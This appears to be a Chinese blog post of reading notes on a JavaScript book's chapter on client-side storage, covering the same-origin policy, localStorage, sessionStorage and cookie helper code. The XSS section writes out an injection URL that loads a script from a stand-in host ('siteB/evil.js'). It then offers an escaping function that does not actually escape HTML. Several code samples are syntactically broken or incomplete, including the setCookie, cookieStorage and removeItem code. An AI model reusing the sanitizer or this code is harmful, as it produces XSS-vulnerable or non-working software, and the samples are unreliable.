---
title: javascript权威指南-第二十章（客户端存储）
date: 2018-03-13 15:28:14
tags: 读书笔记
category: 读书笔记
---
## 概述
二十章讲的是客户端存储，很详细的介绍了常见的几种客户端存储的方式。涉及到一些同源策略的东西，所以就想看一下13章的安全性的问题。也记录一下

### 安全性
同源策略：脚本不能读取不同服务器载入的文档内容。比如说一个页面的脚本不能监听其他页面的用户输入信息，这就是同源策略。这么来看同源策略是必须的，不然浏览一个网页，所有的其他页面的信息都暴露了。
    但是确实有场景需要读取其他页面的属性，可以使用document的domain属性，domain默认是载入文档的主机名，可以人为设置，比如home.example.com可以设置成example.com。不能设置成home.example或者ample.com之类的，也必须有一个.（避免出现com的情况）如果2个窗口的domain一致，就没有同源限制啦。
    跨域资源共享：origin，请求头设置Access-Control-Allow-Origin


#### XSS(粗略了讲了一点安全问题)

对于url:http://www.example.com/greet.html?David
```js
    let name = decodeURIComponent(window.location.search.substring(1)) // search可以拿到？之后的字段（可以理解为query字段？？？），转码之后可以拿到David
    alert(name)
```
但是如果调用http://http.www.example.com/greet.html?name=%3Cscript src=siteB/evil.js%3E%3C/script%3E
这样会注入一个来自siteB的脚本，脚本在sideB中，但是可以在A中进行操作，比较危险

防止XSS的，通过不可信的数据来的时候，去掉里面的HTML标签（包括script标签）,
简单的实现安全函数
```js
name = name.replace(/</g, '<').replace(/</g,'>')
```
### localStorage和sessionStorage的区别
两者的区别在于存储的**有效期**和**作用域**不同，也就是可以存储多长时间以及谁对数据有访问权。
storage都定义了存储、获取、删除的方法

#### 有效期和作用域
localStorage的作用域是文档源级别。文档源就是协议主机和端口一致，也就是说同一个浏览器开多个窗口打开一个页面，是可以共享localStorage的。但是受浏览器供应商的限制。
sessionStorage的作用域也是文档源级别，但是不太相同，它是限定在窗口中的。在不同的标签中不共享。
sessionStorage在浏览器或者标签页关闭，sessionStorage里面存的数据会被删除。

#### 存储的API
```js
localStorage.setItem('x', 1)
localStorage.getItem('X')
/// 遍历
for(let i= 0; i< localStorage.length; i++ ){
    let name = localStorage.key(i)
    let value = localStorage.getItem(name)
}
localStorage.removeItem('X')    //删除X项
localStorage.clear()            //全部删除
```

### cookie

#### cookie属性：有效期和作用域
    cookie的默认有效期是浏览器的会话期间。但是和sessionStorage有区别，cookie不局限在浏览器单个窗口，有效期和整个浏览器的进程有关。
    通过max-age设置有效期设置有效期，他的作用域可以通过path和domain来配置，默认情况和创建他的web页面有关，对子页面可见。
**如果路径设置成'/'就和localStorage一样的作用域了**

#### 保存cookie
```js
// cookie中不允许包含分毫、逗号和空白符，所以一般采用encodeURIComponent转码
// 最简单的cookie设置，浏览器关闭清除
document.cookie = 'version=' + encodeURIComponent(document.lastModified)

// 一个可选max-age、path、domain、secure属性的方法
// 通过设置domain可以解决cookie跨域的问题
const setCookie = (name, value, daysTolive, path, path) = {
    let cookie = `${name}=${encodeURLComponent(value)}`
    if(typeOf daysToLive === 'number'){
        cookie += `; max-age=${daysToLive * 60 * 60 * 24}`
    }
    if(path){
        cookie += `; path=${path}`
    }
    if(domain){
        cookie += `; domain=${domain}`
    }
    document.cookie = cookie
}
```
#### 读取cookie
通过document.cookie读取出来的是一个字符串，不同键值对通过f分号和空格隔开。value的解码方式取决于之前存储用的方式，例如上面用到的setCookie中用的方式是encodeURIComponent编码
```js
const getCookie = (){
    let cookieObj = {}
    let cookieStr = document.cookie
    if(cookieStr === ''){
        return cookieObj
    }
    let cookieArr = cookieStr.split('; ')
    for(let _cookie of cookieArr){
        let p = _cookie.indexOf('=')
        let name = _cookie.slice(0,p)
        let value = _cookie.slice(p+1)
        value = decodeURIComponent(value)
        cookieObj[name] = value
    }
    return cookieObj
}
```
#### cookie相关的存储
实现类似于sessionStorage的getItem、setItem、remove、delete等功能
```js
const cookieStorage(maxage, path) {
    //自执行函数实例化一个cookie对象
    let cookie = (()=>{
        let cookieObj = {}
        let cookieStr = document.cookie
        if(cookieStr === ''){
        return cookieObj
        }
        let cookieArr = cookieStr.split('; ')
        for(let _cookie of cookieArr){
            let p = _cookie.indexOf('=')
            let name = _cookie.slice(0,p)
            let value = _cookie.slice(p+1)
            value = decodeURIComponent(value)
            cookieObj[name] = value
        }
        return cookieObj
    }())
    // 拿出所有的key
    let keys = Object.keys(cookie)
    //存储API公共的属性和方法
    this.length = keys.length
    //返回第n个key的名字，即key方法
    this.key = (n) => {
        if (n<0 || n >= keys.length) return null
        return keys[n]
    }
    //getItem方法
    this.getItem = (name) => cookie[name] || null
    // setItem方法
    this.setItem = (key,value) => {
        //首先判断要存储的cookie存在不,不存在先操作一次keys和length
        if(!(key in keys)){
            keys.push(key)
            this.length++
        }
        // 针对cookie对象做的操作
        cookie[key] = value
        //接下来就是正式操作浏览器中的cookie
        let domCookie = `${key}=${encodeURIComponent(value)}`
        if(maxage) domCookie += `; max-age=${maxage}`
        if(path) domCookie += `; path=${path}`
        document.cookie = domCookie
    }
    // removeCookie
    this.removeItem = (key) => {
        if(!(key in cookie)) return
        delete cookie[key]
        this.length--
        let p = keys.indexOf(key)
        keys.splice(p,1)
        document.cookie = 
    }
    // clear
    this.clear = () => {
        for(let key of keys){
            document.cookie = `${key}=; max-age=0`
        }
        cookie = {}
        keys = []
        this.length = 0
    }
}
```